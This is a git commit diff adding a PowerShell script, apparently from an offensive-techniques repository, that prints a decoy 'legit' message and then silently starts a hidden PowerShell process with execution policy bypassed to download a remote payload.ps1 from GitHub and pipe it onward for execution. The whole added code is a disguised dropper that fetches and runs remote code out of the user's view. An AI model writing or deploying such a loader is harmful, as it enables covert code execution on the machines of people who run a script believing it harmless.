a6eac9186e491d71287c729e136d05c76e679fd7
starchyunderscore <spenceramay22@gmail.com>
2023-10-24 09:35:46 -0400

    Update run.ps1

--- method-1/run.ps1
+++ method-1/run.ps1
@@ -1,1 +1,5 @@
-
+Write-Output "Any code can be put here to make this look legit"
+Start-Process PowerShell -WindowStyle Hidden "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/starchyunderscore/offensive-ps/main/method-1/payload.ps1 | iwr`""
+Write-Output "We can even exit the powershell window (we will in 10 seconds)"
+Start-Sleep -Seconds 10
+Exit 0
